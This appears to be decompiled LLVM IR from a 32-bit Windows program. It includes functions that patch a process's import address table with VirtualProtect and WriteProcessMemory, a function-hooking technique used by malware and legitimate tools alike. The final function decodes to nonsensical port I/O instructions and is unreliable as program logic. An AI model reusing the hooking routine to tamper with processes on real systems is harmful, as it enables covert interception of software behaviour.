  %18 = add i32 %eax.0.reload, 12, !insn.addr !1985
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1985
  store i32 %17, i32* %19, align 4, !insn.addr !1985
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1986
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1987
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1987
  store i32 %20, i32* %22, align 4, !insn.addr !1987
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1988
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1988
  store i32 %arg3, i32* %24, align 4, !insn.addr !1988
  %25 = load i32, i32* %22, align 4, !insn.addr !1989
  %26 = add i32 %esp.0, -8, !insn.addr !1990
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1990
  store i32 %25, i32* %27, align 4, !insn.addr !1990
  %28 = add i32 %esp.0, -12, !insn.addr !1991
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1991
  store i32 %17, i32* %29, align 4, !insn.addr !1991
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1992
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1992
  %32 = add i32 %esp.0, -16, !insn.addr !1993
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1993
  store i32 %31, i32* %33, align 4, !insn.addr !1993
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1994
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1994
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1995
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1995
  store i32 %35, i32* %37, align 4, !insn.addr !1995
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1996
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1997
  br i1 %38, label %dec_label_pc_407647, label %dec_label_pc_407633, !insn.addr !1997

dec_label_pc_407633:                              ; preds = %dec_label_pc_40760b
  %39 = load i32, i32* %24, align 4, !insn.addr !1998
  %40 = add i32 %esp.0, -20, !insn.addr !1999
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1999
  store i32 %39, i32* %41, align 4, !insn.addr !1999
  %42 = load i32, i32* %15, align 4, !insn.addr !2000
  %43 = add i32 %esp.0, -24, !insn.addr !2001
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2001
  store i32 %42, i32* %44, align 4, !insn.addr !2001
  %45 = call i32 @function_4076b0(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2002
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2002
  br label %dec_label_pc_407647, !insn.addr !2002

dec_label_pc_407647:                              ; preds = %dec_label_pc_407633, %dec_label_pc_40760b, %dec_label_pc_4075ef
  br i1 %7, label %dec_label_pc_40765e, label %dec_label_pc_40764f, !insn.addr !2003

dec_label_pc_40764f:                              ; preds = %dec_label_pc_407647
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2004
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2005
  %48 = load i32, i32* %47, align 4, !insn.addr !2005
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2005
  br label %dec_label_pc_40765e, !insn.addr !2006

dec_label_pc_40765e:                              ; preds = %dec_label_pc_40764f, %dec_label_pc_407647
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2007
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2007
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1979
  ret i32 %eax.0.reload, !insn.addr !2008
}

define i32 @function_407668() local_unnamed_addr {
dec_label_pc_407668:
  %eax.1.reg2mem = alloca i32, !insn.addr !2009
  %eax.0.reg2mem = alloca i32, !insn.addr !2009
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2010
  %4 = add i32 %3, 8, !insn.addr !2011
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2011
  %6 = load i32, i32* %5, align 4, !insn.addr !2011
  %7 = icmp eq i32 %6, 0, !insn.addr !2011
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2012
  br i1 %7, label %dec_label_pc_4076a2, label %dec_label_pc_407679, !insn.addr !2012

dec_label_pc_407679:                              ; preds = %dec_label_pc_407668
  %8 = add i32 %3, 24, !insn.addr !2013
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2013
  %10 = load i32, i32* %9, align 4, !insn.addr !2013
  %11 = icmp eq i32 %10, 0, !insn.addr !2013
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2014
  br i1 %11, label %dec_label_pc_4076a2, label %dec_label_pc_40767f, !insn.addr !2014

dec_label_pc_40767f:                              ; preds = %dec_label_pc_407679
  %12 = add i32 %3, 4, !insn.addr !2015
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2015
  %14 = load i32, i32* %13, align 4, !insn.addr !2015
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2016
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2017
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2017
  %18 = load i32, i32* %5, align 4, !insn.addr !2018
  %19 = icmp eq i32 %18, %17, !insn.addr !2018
  %20 = icmp eq i1 %19, false, !insn.addr !2019
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2019
  br i1 %20, label %dec_label_pc_4076a2, label %dec_label_pc_40768d, !insn.addr !2019

dec_label_pc_40768d:                              ; preds = %dec_label_pc_40767f
  %21 = load i32, i32* %9, align 4, !insn.addr !2020
  %22 = call i32 @function_4076b0(i32 %21), !insn.addr !2021
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2021
  br label %dec_label_pc_4076a2, !insn.addr !2021

dec_label_pc_4076a2:                              ; preds = %dec_label_pc_40768d, %dec_label_pc_40767f, %dec_label_pc_407679, %dec_label_pc_407668
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2022
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2023
  br i1 %24, label %dec_label_pc_4076ad, label %dec_label_pc_4076a6, !insn.addr !2023

dec_label_pc_4076a6:                              ; preds = %dec_label_pc_4076a2
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2024
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2024
  br label %dec_label_pc_4076ad, !insn.addr !2024

dec_label_pc_4076ad:                              ; preds = %dec_label_pc_4076a6, %dec_label_pc_4076a2
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2025
}

define i32 @function_4076b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4076b0:
  %eax.0.reg2mem = alloca i32, !insn.addr !2026
  %esp.0.reg2mem = alloca i32, !insn.addr !2026
  %storemerge6.reg2mem = alloca i32, !insn.addr !2026
  %.reg2mem14 = alloca i32, !insn.addr !2026
  %esp.17.reg2mem = alloca i32, !insn.addr !2026
  %esi.08.reg2mem = alloca i32, !insn.addr !2026
  %.reg2mem = alloca i32, !insn.addr !2026
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2027
  %4 = icmp eq i1 %3, false, !insn.addr !2028
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2029
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_40775d, label %dec_label_pc_4076d6, !insn.addr !2028

dec_label_pc_4076d6:                              ; preds = %dec_label_pc_4076b0
  %6 = trunc i32 %2 to i16, !insn.addr !2030
  %7 = trunc i32 %1 to i8, !insn.addr !2031
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2032
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2033
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2033
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2033
  %11 = icmp eq i32* %9, null, !insn.addr !2034
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2035
  br i1 %11, label %dec_label_pc_40775d, label %dec_label_pc_407756.preheader, !insn.addr !2035

dec_label_pc_407756.preheader:                    ; preds = %dec_label_pc_4076d6
  %12 = add i32 %10, 12, !insn.addr !2036
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2036
  %14 = load i32, i32* %13, align 4, !insn.addr !2036
  %15 = icmp eq i32 %14, 0, !insn.addr !2037
  %16 = icmp eq i1 %15, false, !insn.addr !2038
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2038
  br i1 %16, label %dec_label_pc_4076ef.lr.ph, label %dec_label_pc_40775d, !insn.addr !2038

dec_label_pc_4076ef.lr.ph:                        ; preds = %dec_label_pc_407756.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2032
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2039
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_4076ef

dec_label_pc_4076ef:                              ; preds = %dec_label_pc_4076ef.lr.ph, %dec_label_pc_407753
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2040
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2041
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2041
  store i32 %18, i32* %25, align 4, !insn.addr !2041
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2042
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2042
  store i32 %23, i32* %27, align 4, !insn.addr !2042
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2043
  %29 = icmp eq i32 %28, 0, !insn.addr !2044
  %30 = icmp eq i1 %29, false, !insn.addr !2045
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2045
  br i1 %30, label %dec_label_pc_407753, label %dec_label_pc_407702, !insn.addr !2045

dec_label_pc_407702:                              ; preds = %dec_label_pc_4076ef
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2046
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2046
  %33 = load i32, i32* %32, align 4, !insn.addr !2046
  %34 = add i32 %33, %arg1, !insn.addr !2047
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2048
  %36 = load i32, i32* %35, align 4, !insn.addr !2048
  %37 = icmp eq i32 %36, 0, !insn.addr !2049
  %38 = icmp eq i1 %37, false, !insn.addr !2050
  store i32 %36, i32* %.reg2mem14, !insn.addr !2050
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2050
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2050
  br i1 %38, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2050

dec_label_pc_40770a:                              ; preds = %dec_label_pc_407702, %dec_label_pc_40774a
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2051
  %40 = icmp eq i1 %39, false, !insn.addr !2052
  br i1 %40, label %dec_label_pc_40774a, label %dec_label_pc_40770f, !insn.addr !2052

dec_label_pc_40770f:                              ; preds = %dec_label_pc_40770a
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2053
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2053
  store i32 %20, i32* %42, align 4, !insn.addr !2053
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2054
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2054
  store i32 128, i32* %44, align 4, !insn.addr !2054
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2055
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2055
  store i32 4, i32* %46, align 4, !insn.addr !2055
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2056
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2056
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2056
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2057
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2058
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2058
  store i32 %21, i32* %51, align 4, !insn.addr !2058
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2059
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2059
  store i32 4, i32* %53, align 4, !insn.addr !2059
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2060
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2060
  store i32 %22, i32* %55, align 4, !insn.addr !2060
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2061
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2061
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2061
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2062
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2062
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2063
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2063
  store i32 %59, i32* %61, align 4, !insn.addr !2063
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2064
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2065
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2065
  store i32 %21, i32* %64, align 4, !insn.addr !2065
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2066
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2067
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2067
  store i32 %65, i32* %67, align 4, !insn.addr !2067
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2068
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2068
  store i32 4, i32* %69, align 4, !insn.addr !2068
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2069
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2069
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2069
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2070
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2071
  br label %dec_label_pc_407753, !insn.addr !2071

dec_label_pc_40774a:                              ; preds = %dec_label_pc_40770a
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2072
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2048
  %75 = load i32, i32* %74, align 4, !insn.addr !2048
  %76 = icmp eq i32 %75, 0, !insn.addr !2049
  %77 = icmp eq i1 %76, false, !insn.addr !2050
  store i32 %75, i32* %.reg2mem14, !insn.addr !2050
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2050
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2050
  br i1 %77, label %dec_label_pc_40770a, label %dec_label_pc_407753, !insn.addr !2050

dec_label_pc_407753:                              ; preds = %dec_label_pc_40774a, %dec_label_pc_407702, %dec_label_pc_40770f, %dec_label_pc_4076ef
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2073
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2036
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2036
  %81 = load i32, i32* %80, align 4, !insn.addr !2036
  %82 = icmp eq i32 %81, 0, !insn.addr !2037
  %83 = icmp eq i1 %82, false, !insn.addr !2038
  store i32 %81, i32* %.reg2mem, !insn.addr !2038
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2038
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2038
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2038
  br i1 %83, label %dec_label_pc_4076ef, label %dec_label_pc_40775d, !insn.addr !2038

dec_label_pc_40775d:                              ; preds = %dec_label_pc_407753, %dec_label_pc_407756.preheader, %dec_label_pc_4076d6, %dec_label_pc_4076b0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2074
}

define i32 @function_407768(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407768:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2075
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2075
  %3 = load i32, i32* %2, align 4, !insn.addr !2075
  ret i32 %3, !insn.addr !2076
}

define i32 @function_40776c() local_unnamed_addr {
dec_label_pc_40776c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2077
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2077
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2077
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2078
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2079
  %3 = add i32 %2, 1, !insn.addr !2079
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2079
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2080
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2081
  ret i32 0, !insn.addr !2082
}

define i32 @function_407791() local_unnamed_addr {
dec_label_pc_407791:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2083
  ret i32 %0, !insn.addr !2083
}

define i32 @function_407796() local_unnamed_addr {
dec_label_pc_407796:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2084
}

define i32 @function_407798(i32 %arg1) local_unnamed_addr {
dec_label_pc_407798:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2085
}

define i32 @function_40779c() local_unnamed_addr {
dec_label_pc_40779c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2086
  %2 = add i32 %1, -1, !insn.addr !2086
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2086
  ret i32 %0, !insn.addr !2087
}

define i32 @function_4077a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_407768(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2088
  ret i32 %3, !insn.addr !2089
}

define i32 @function_4077f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4077f0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2090
  %2 = icmp eq i1 %1, false, !insn.addr !2091
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_407768(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2092
  ret i32 %3, !insn.addr !2093
}

define i32 @function_407820(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407820:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2094
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2094
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2094
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2095
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2096
  %3 = call i32 @"@LStrPos"(), !insn.addr !2097
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2098
  %6 = call i32 @"@LStrPos"(), !insn.addr !2099
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_4078f8 to i32)
  %8 = call i32 @function_407768(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2100
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2101
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2102
  ret i32 %9, !insn.addr !2103
}

define i32 @function_4078b8() local_unnamed_addr {
dec_label_pc_4078b8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2104
  ret i32 %0, !insn.addr !2104
}

define i32 @function_4078bd() local_unnamed_addr {
dec_label_pc_4078bd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2105
}

define i32 @function_4078bf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2106
}

define i32 @function_4078cf() local_unnamed_addr {
dec_label_pc_4078cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2107
}

define i32 @function_40791c() local_unnamed_addr {
dec_label_pc_40791c:
  %0 = call i32 @function_4075dc(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40798c, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_407998, i32 0, i32 0), i32 4224932), !insn.addr !2108
  store i32 %0, i32* @global_var_40810c, align 4, !insn.addr !2109
  %1 = call i32 @function_4075dc(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_40798c, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079b4, i32 0, i32 0), i32 4225008), !insn.addr !2110
  store i32 %1, i32* @global_var_408110, align 4, !insn.addr !2111
  %2 = call i32 @function_4075dc(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079cc, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_4079d8, i32 0, i32 0), i32 4225056), !insn.addr !2112
  store i32 %2, i32* @global_var_408114, align 4, !insn.addr !2113
  ret i32 %2, !insn.addr !2114
}

define i32 @function_40798c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_40798c:
  %merge.reg2mem = alloca i32, !insn.addr !2115
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2115
  br i1 %10, label %dec_label_pc_4079bb, label %dec_label_pc_40798e, !insn.addr !2115

dec_label_pc_40798e:                              ; preds = %dec_label_pc_40798c
  br i1 %8, label %dec_label_pc_4079c4, label %dec_label_pc_407991, !insn.addr !2116

dec_label_pc_407991:                              ; preds = %dec_label_pc_40798e
  %11 = trunc i32 %4 to i16, !insn.addr !2117
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2117
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2117
  store i8 %12, i8* %13, align 1, !insn.addr !2117
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2118
  store i8 %14, i8* %13, align 1, !insn.addr !2118
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2119
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2119
  %19 = add i8 %16, %18, !insn.addr !2119
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2119
  store i8 %19, i8* %20, align 1, !insn.addr !2119
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2120
  %21 = trunc i32 %arg10 to i16, !insn.addr !2121
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2121
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2121
  store i32 %22, i32* %23, align 4, !insn.addr !2121
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2122
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2123
  %25 = load i8, i8* %24, align 1, !insn.addr !2123
  %26 = trunc i32 %arg1 to i8, !insn.addr !2123
  %27 = add i8 %25, %26, !insn.addr !2123
  store i8 %27, i8* %24, align 1, !insn.addr !2123
  %28 = trunc i32 %arg3 to i16, !insn.addr !2124
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2124
  %30 = load i32, i32* %29, align 4, !insn.addr !2124
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2124
  %31 = add i32 %arg5, 67, !insn.addr !2125
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2125
  %34 = load i32, i32* %33, align 4, !insn.addr !2125
  %35 = load i8, i8* %24, align 1, !insn.addr !2126
  %36 = add i8 %35, %26, !insn.addr !2126
  store i8 %36, i8* %24, align 1, !insn.addr !2126
  %37 = mul i32 %34, 1557718248, !insn.addr !2127
  %38 = add i32 %arg7, 97, !insn.addr !2127
  %39 = add i32 %38, %37, !insn.addr !2127
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2127
  %41 = load i8, i8* %40, align 1, !insn.addr !2127
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2127
  %44 = add i8 %43, %41, !insn.addr !2127
  %45 = icmp eq i8 %44, 0, !insn.addr !2127
  store i8 %44, i8* %40, align 1, !insn.addr !2127
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2128
  br i1 %45, label %dec_label_pc_407a2d, label %dec_label_pc_4079bb, !insn.addr !2128

dec_label_pc_4079bb:                              ; preds = %dec_label_pc_40798c, %dec_label_pc_407991
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2129

dec_label_pc_4079c4:                              ; preds = %dec_label_pc_40798e
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2130
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2130
  store i8 %48, i8* %49, align 1, !insn.addr !2130
  %50 = add i32 %3, 104, !insn.addr !2131
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2131
  %52 = load i8, i8* %51, align 1, !insn.addr !2131
  %53 = udiv i32 %4, 256, !insn.addr !2131
  %54 = trunc i32 %53 to i8, !insn.addr !2131
  %55 = add i8 %52, %54, !insn.addr !2131
  store i8 %55, i8* %51, align 1, !insn.addr !2131
  %56 = trunc i32 %4 to i16, !insn.addr !2132
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2132
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2132
  store i8 %57, i8* %58, align 1, !insn.addr !2132
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2133
  store i8 %59, i8* %58, align 1, !insn.addr !2133
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2134
  store i8 %60, i8* %58, align 1, !insn.addr !2134
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2135
  store i8 %61, i8* %58, align 1, !insn.addr !2135
  %62 = load i8, i8* %51, align 1, !insn.addr !2136
  %63 = trunc i32 %4 to i8, !insn.addr !2136
  %64 = add i8 %62, %63, !insn.addr !2136
  store i8 %64, i8* %51, align 1, !insn.addr !2136
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2137
  store i8 %65, i8* %58, align 1, !insn.addr !2137
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2138
  store i8 %66, i8* %58, align 1, !insn.addr !2138
  %67 = add i32 %2, 1, !insn.addr !2139
  %68 = icmp slt i32 %67, 0, !insn.addr !2139
  br i1 %68, label %dec_label_pc_407a45, label %dec_label_pc_4079e0, !insn.addr !2140

dec_label_pc_4079e0:                              ; preds = %dec_label_pc_4079c4
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2141
  %72 = xor i32 %4, %1, !insn.addr !2142
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2143
